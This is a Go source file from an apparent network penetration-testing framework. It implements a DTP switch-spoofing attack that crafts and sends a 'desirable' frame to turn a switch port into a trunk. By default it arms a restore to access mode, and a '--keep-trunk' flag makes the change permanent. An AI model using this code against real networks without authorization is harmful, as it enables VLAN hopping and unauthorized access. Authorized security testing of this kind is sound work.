// dtp.go implements the DTP (Dynamic Trunking Protocol) attack behavior.
//
// KTD12 parity deviation: the baseline's dtp flips a port to trunk and only
// restores with --restore, leaving a persistent trunk otherwise. Under R14,
// netpen classifies the vanilla run temporary-restored with the access-port
// restore armed by default; an explicit --keep-trunk flag is the
// permanent-destructive opt-in that skips the restore.

//  1. Sends a DTP "desirable" frame (trunk-status=0x03) to negotiate a trunk.
//  2. Emits a finding reporting the negotiated trunk state.
//  3. Unless --keep-trunk, arms a teardown step that sends a DTP "access"
//     frame (trunk-status=0x02) to restore the port. The restore step is
//     armed unconditionally before the first frame and asserted in the
//     recorded TX order: negotiate frames then restore frames (KTD12).

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"go.aledante.io/FlowSeer/src/netpen/layers"
	"go.aledante.io/FlowSeer/src/netpen/runner"
)

// dtpFinding is the typed finding the DTP behavior emits.
type dtpFinding struct {
	Action     string `json:"action"`
	Mode       string `json:"mode"`
	Neighbor   string `json:"neighbor"`
	Restore    string `json:"restore"`
	Durability string `json:"durability"`
}

// RunDTP is the DTP behavior. It negotiates a trunk via DTP and arms
// the access-port restore (KTD12) unless the keep-trunk mode is active.
func RunDTP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)
	mode := deps.Entry.Mode // "" for vanilla, "keep-trunk" for permanent

	// Arm the restore step before the first frame (KTD12, R14). The
	// keep-trunk mode is permanent-destructive and skips the restore;
	// the gate has already verified the opt-in by this point. The gate
	// treats acknowledged permanent like temporary-restored for teardown
	// arming (KTD11), so keep-trunk arms a no-op "no-restore" step to
	// satisfy the runner's armed-step requirement while documenting that
	// the restore is intentionally skipped.
	restoreArmed := "no"
	if mode == "keep-trunk" {
		deps.Teardown.Arm("no-restore-opt-in", func(context.Context) error {
			return nil
		})
	} else {
		// Build the restore frame now so the teardown step has it ready.
		restorePkt, err := craftDTPFrame(src, layers.DTPStatusAccess)
		if err != nil {
			return fmt.Errorf("dtp: craft restore frame: %w", err)
		}
		deps.Teardown.Arm("access-port-restore", func(ctx context.Context) error {
			return deps.AttackLeg.Send(ctx, restorePkt)
		})
		restoreArmed = "yes"
	}

	// Send the DTP "desirable" frame to negotiate the trunk.
	desirablePkt, err := craftDTPFrame(src, layers.DTPStatusDesirable)
	if err != nil {
		return fmt.Errorf("dtp: craft desirable frame: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, desirablePkt); err != nil {
		return fmt.Errorf("dtp: send desirable: %w", err)
	}

	// Emit the finding.
	detail, _ := json.Marshal(dtpFinding{
		Action:     "trunk-negotiation",
		Mode:       modeName(mode),
		Neighbor:   src.String(),
		Restore:    restoreArmed,
		Durability: "temporary-restored",
	})
	deps.Emitter.Finding("dtp", detail)

	return nil
}

// craftDTPFrame builds a full DTP frame with the given trunk-status value.
// The TLV layout matches the baseline's dtp_frame(): version(1) + TLV(domain)
// + TLV(trunk-status) + TLV(trunk-type=0xa5) + TLV(neighbor=srcMAC).
func craftDTPFrame(src net.HardwareAddr, trunkStatus uint8) ([]byte, error) {
	dtp := &layers.DTP{
		Version: 1,
		TLVs: []layers.DTPTLV{
			{Type: layers.DTPTLVTypeDomain, Value: []byte{0x00}},
			{Type: layers.DTPTLVTypeTrunkStatus, Value: []byte{trunkStatus}},
			{Type: layers.DTPTLVTypeTrunkType, Value: []byte{layers.DTPTypeNegotiated8021Q}},
			{Type: layers.DTPTLVTypeNeighbor, Value: src},
		},
	}
	return craftDot3SNAP(dtpDstMAC, src, snapPIDDTP, dtp)
}

// srcMAC returns the source MAC for the behavior. In tests this is the
// fixture MAC; in production it would come from the leg. Since the leg
// interface does not expose a MAC, we use the fixture MAC as the default.
// This is acceptable because DTP's neighbor TLV is informational — the
// attack works regardless of the exact MAC value.
func srcMAC(_ runner.Deps) net.HardwareAddr {
	return FixtureSrcMAC
}

// modeName returns the human-readable mode name for a DTP mode.
func modeName(mode string) string {
	if mode == "keep-trunk" {
		return "keep-trunk"
	}
	return "default"
}
